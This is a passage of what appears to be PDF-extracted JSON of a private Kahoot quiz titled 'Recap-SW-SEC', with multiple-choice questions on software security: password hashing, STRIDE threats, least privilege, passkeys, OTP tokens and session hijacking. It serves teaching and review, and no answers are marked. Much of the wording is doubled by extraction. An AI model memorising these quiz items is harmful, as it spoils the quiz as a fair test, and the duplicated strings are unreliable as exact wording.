a\npassword-hashing algorithm\nSHA-256 is fast, makingSHA-256 is fast, making\nlarge-scale offline passwordlarge-scale offline password\nguessing efficientguessing efficient\nSHA-256 is fast, making\nlarge-scale offline password\nguessing efficient\nSHA-256 cannot produce aSHA-256 cannot produce a\nfixed-length digest for Unicodefixed-length digest for Unicode\npasswordspasswords\nSHA-256 cannot produce a\nfixed-length digest for Unicode\npasswords\nWhich authentication factor does a fingerprint\nrepresent?\nSSomething you knowomething you knowSomething you know SSomething you haveomething you haveSomething you have\nSSomething you areomething you areSomething you are SSomewhere you areomewhere you areSomewhere you are\n11/1/26, 6:09 PM Recap-SW-SEC - Details - Kahoot!\nhttps://create.kahoot.it/details/recap-sw-sec/2c059000-bdb0-420c-8556-6801b2f1fa7c?drawer= 1/4"
+      },
+      {
+        "page": 2,
+        "text": "7 - Quiz 8 - Quiz\n9 - Quiz 10 - Quiz\n11 - Quiz 12 - Quiz\n13 - Quiz 14 - Quiz\nBiometric authentication systems commonly evaluate\nperformance using.....\nRTT and latencyRTT and latencyRTT and latency FAR & FRRFAR & FRRFAR & FRR\nIntegrity & AvailabilityIntegrity & AvailabilityIntegrity & Availability NNoneoneNone\nUsing STRIDE-per-element mapping on a Data Flow\nDiagram, which threats apply to a Data Store?\nSpoofing, Repudiation, DenialSpoofing, Repudiation, Denial\nof Serviceof Service\nSpoofing, Repudiation, Denial\nof Service\nSpoofing, Elevation ofSpoofing, Elevation of\nPrivilege, RepudiationPrivilege, Repudiation\nSpoofing, Elevation of\nPrivilege, Repudiation\nSpoofing, Tampering, ElevationSpoofing, Tampering, Elevation\nof Privilegeof Privilege\nSpoofing, Tampering, Elevation\nof Privilege\nTampering, InformationTampering, Information\nDisclosure, Denial of ServiceDisclosure, Denial of Service\nTampering, Information\nDisclosure, Denial of Service\nWhich principle is most directly violated when an\napplication grants all users administrator privileges by\ndefault?\nDefense in DepthDefense in DepthDefense in Depth Least PrivilegeLeast PrivilegeLeast Privilege\nSeparation of DutiesSeparation of DutiesSeparation of Duties Fail SecurelyFail SecurelyFail Securely\nA \"shift-left security\" strategy means?\nIIntegrating security earlierntegrating security earlier\nin developmentin development\nIntegrating security earlier\nin development\nRReducing security testingeducing security testing\nefforteffort\nReducing security testing\neffort\nMMoving securityoving security\nresponsibilities to operationsresponsibilities to operations\nteamsteams\nMoving security\nresponsibilities to operations\nteams\nEEncrypting source codencrypting source codeEncrypting source code\nAn OTP generated by a hardware token is primarily\nbased on...\nSStatic password storagetatic password storageStatic password storage SShared secret andhared secret and\ntime/counter valuetime/counter value\nShared secret and\ntime/counter value\nPPublic-key encryption onlyublic-key encryption onlyPublic-key encryption only HHash collisionsash collisionsHash collisions\nWhat is the main purpose of software composition\nanalysis (SCA)?\nDDetect memory leaksetect memory leaksDetect memory leaks PPerform penetration testingerform penetration testingPerform penetration testing\nOOptimize database queriesptimize database queriesOptimize database queries\nAAnalyze third-partynalyze third-party\ndependencies fordependencies for\nvulnerabilitiesvulnerabilities\nAnalyze third-party\ndependencies for\nvulnerabilities\nWhich authentication attack occurs when a valid\nsession identifier is stolen and reused?\nDDictionary attackictionary attackDictionary attack TTailgatingailgatingTailgating\nSSmurf attackmurf attackSmurf attack SSession hijackingession hijackingSession hijacking\nA system requires two independent approvals before\ntransferring funds. Which principle is primarily being\nenforced?\nComplete MediationComplete MediationComplete Mediation Economy of MechanismEconomy of MechanismEconomy of Mechanism\nSeparation of DutiesSeparation of DutiesSeparation of Duties Psychological AcceptabilityPsychological AcceptabilityPsychological Acceptability\n11/1/26, 6:09 PM Recap-SW-SEC - Details - Kahoot!\nhttps://create.kahoot.it/details/recap-sw-sec/2c059000-bdb0-420c-8556-6801b2f1fa7c?drawer= 2/4"
+      },
+      {
+        "page": 3,
+        "text": "15 - True or false 16 - Quiz\n17 - Quiz 18 - Quiz\n19 - Quiz 20 - Quiz\n21 - Quiz 22 - Quiz\nDREAD is recommended method for prioritizing\nthreats identified during a STRIDE-based threat model\nTTruerueTrue FFalsealseFalse\nWhich attack is MOST likely prevented through secure\ninput validation?\nPPassword sprayingassword sprayingPassword spraying SQL InjectionSQL InjectionSQL Injection\nSShoulder surfinghoulder surfingShoulder surfing TTailgatingailgatingTailgating\nWhat is the primary advantage of passkeys over\npasswords?\nPPhishing resistance throughhishing resistance through\npublic-key cryptographypublic-key cryptography\nPhishing resistance through\npublic-key cryptography Smaller Storage sizeSmaller Storage sizeSmaller Storage size\nRate LimitingRate LimitingRate Limiting NNoneoneNone\nWhich authentication approach continuously verifies\nuser identity during a session?\nOOne-time authenticationne-time authenticationOne-time authentication BBehavioral biometricsehavioral biometricsBehavioral biometrics\nChallenge HashingChallenge HashingChallenge Hashing DDigital signaturesigital signaturesDigital signatures\nA firewall, IDS, MFA, and network segmentation are\ndeployed simultaneously. This is the best example\nof.....\nOpen DesignOpen DesignOpen Design Defense in DepthDefense in DepthDefense in Depth\nLeast Common MechanismLeast Common MechanismLeast Common Mechanism Fail-Safe DefaultsFail-Safe DefaultsFail-Safe Defaults\nAn application relies solely on hiding API endpoints\nwithout enforcing access control. Which principle is\nviolated?\nOpen DesignOpen DesignOpen Design Work FactorWork FactorWork Factor\nLeast PrivilegeLeast PrivilegeLeast Privilege NNoneoneNone\nAn authentication mechanism intentionally locks\naccounts after multiple failed attempts. This reflects.....\nPsychological AcceptabilityPsychological AcceptabilityPsychological Acceptability Fail-Safe DefaultsFail-Safe DefaultsFail-Safe Defaults\nFail-Over DefaultsFail-Over DefaultsFail-Over Defaults Economy of MechanismEconomy of MechanismEconomy of Mechanism\nDuring threat modeling, an attacker denies having\ninitiated a financial transaction. Which STRIDE\ncategory is involved?\nTTamperingamperingTampering RRepudiationepudiationRepudiation\nSSpoofingpoofingSpoofing DoSDoSDoS\n11/1/26, 6:09 PM Recap-SW-SEC - Details - Kahoot!\nhttps://create.kahoot.it/details/recap-sw-sec/2c059000-bdb0-420c-8556-6801b2f1fa7c?drawer= 3/4"
+      },
+      {
+        "page": 4,
+        "text": "23 - Quiz 24 - Quiz\nDetails\nMax. 10 participants. Upgrade for more\nUpdated 1 week ago \u2022 Visibility: Private\nMedia credits\nCover image: sarayut Thaneerat/Moment/Getty Images\n2. designer491/iStock/Getty Images\n10. MirageC/Moment/Getty Images\nWhich SSDLC practice would have MOST likely\nidentified these issues earlier?\nThreat Modeling duringThreat Modeling during\nDesignDesign\nThreat Modeling during\nDesign Patch ManagementPatch ManagementPatch Management\nIncident ResponseIncident ResponseIncident Response Source Code BackupSource Code BackupSource Code Backup\nA hospital system ensures doctors can access only\nrecords of their assigned patients. Which principle is\nbeing applied?\nOpen DesignOpen DesignOpen Design Defense in DepthDefense in DepthDefense in Depth\nLeast PrivilegeLeast PrivilegeLeast Privilege Complete MediationComplete MediationComplete Mediation\n11/1/26, 6:09 PM Recap-SW-SEC - Details - Kahoot!\nhttps://create.kahoot.it/details/recap-sw-sec/2c059000-bdb0-420c-8556-6801b2f1fa7c?drawer= 4/4"
+      }
+    ]
+  }
+]
